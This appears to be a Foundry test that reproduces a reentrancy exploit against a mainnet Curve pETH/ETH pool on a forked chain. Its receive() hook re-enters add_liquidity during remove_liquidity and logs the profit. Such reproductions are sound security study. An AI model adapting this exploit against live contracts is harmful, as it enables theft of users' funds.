// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8;

import {Test, console} from "forge-std/Test.sol";

import {ICurve} from "src/interfaces/ICurve.sol";
import {WETH9} from "src/interfaces/WETH9.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract HackTest is Test {
    WETH9 WETH = WETH9(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 pETH = IERC20(0x836A808d4828586A69364065A1e064609F5078c7);
    ICurve pool = ICurve(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);

    bool performReentrancy = false;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_806_055);
        vm.deal(address(this), 1_000_001 ether);
    }

    function testHack() public {
		uint256 balance = address(this).balance;
        console.log("initial balance", balance);

        uint256[2] memory amount;
        amount[0] = 40_000 ether;
        amount[1] = 0;
        pool.add_liquidity{value: 40_000 ether}(amount, 0);
        console.log("balance after add liquidity", address(this).balance);

        performReentrancy = true;
        amount[0] = 0;
        pool.remove_liquidity(pool.balanceOf(address(this)), amount);
        performReentrancy = false;
        console.log("balance after remove liquidity #1", address(this).balance);

        pool.remove_liquidity(10_272 ether, amount);
        console.log("balance after remove liquidity #2", address(this).balance);

        console.log("final balance", address(this).balance);
		console.log("profit", address(this).balance - balance);
    }

    receive() external payable {
        if (performReentrancy) {
            uint256[2] memory amount;
            amount[0] = 40_000 ether;
            amount[1] = 0;
            pool.add_liquidity{value: 40_000 ether}(amount, 0);

            console.log(
                "balance after add liquidity (reentrancy)",
                address(this).balance
            );
        }
    }

}
